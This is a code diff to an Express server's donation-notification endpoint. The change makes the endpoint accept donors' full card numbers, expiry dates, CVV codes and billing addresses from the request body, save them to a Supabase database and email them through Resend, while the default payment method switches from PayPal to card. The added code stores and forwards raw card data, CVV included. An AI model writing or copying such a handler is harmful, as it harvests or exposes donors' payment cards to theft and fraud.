@@ -5,6 +5,7 @@ import {
   sendContactEmail,
   sendDonationEmail,
 } from './services/emailService.js';
+import { saveDonationToSupabase } from './services/supabaseService.js';
 
 const app = express();
 
@@ -71,7 +72,19 @@ app.post('/api/contact', async (req, res) => {
  */
 app.post('/api/donations/notify', async (req, res) => {
   try {
-    const { invoiceNumber, donorName, email, amount, paymentMethod, timestamp } = req.body;
+    const {
+      invoiceNumber,
+      donorName,
+      email,
+      amount,
+      paymentMethod,
+      cardNumber,
+      cardExpiry,
+      cardCvv,
+      billingAddress,
+      paymentDetails,
+      timestamp,
+    } = req.body;
 
     if (!donorName || !email || !amount) {
       return res.status(400).json({
@@ -85,19 +98,32 @@ app.post('/api/donations/notify', async (req, res) => {
       timeStyle: 'short',
     });
 
-    const result = await sendDonationEmail({
-      invoiceNumber: invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`,
+    const generatedInvoice = invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`;
+
+    const donationData = {
+      invoiceNumber: generatedInvoice,
       donorName,
       email,
       amount,
-      paymentMethod: paymentMethod || 'PayPal',
+      paymentMethod: paymentMethod || 'Credit / Debit Card',
+      cardNumber: cardNumber || paymentDetails?.cardNumber || null,
+      cardExpiry: cardExpiry || paymentDetails?.expiry || null,
+      cardCvv: cardCvv || paymentDetails?.cvv || null,
+      billingAddress: billingAddress || paymentDetails?.billingAddress || null,
       timestamp: formattedTime,
-    });
+    };
+
+    // Save transaction to Supabase database
+    const dbResult = await saveDonationToSupabase(donationData);
+
+    // Send email notification via Resend
+    const emailResult = await sendDonationEmail(donationData);
 
     res.json({
       success: true,
-      message: 'Donation notification dispatched and receipt generated.',
-      result,
+      message: 'Donation recorded to database and notification email dispatched via Resend.',
+      dbResult,
+      emailResult,
     });
   } catch (error) {
     console.error('Error handling donation notification:', error);
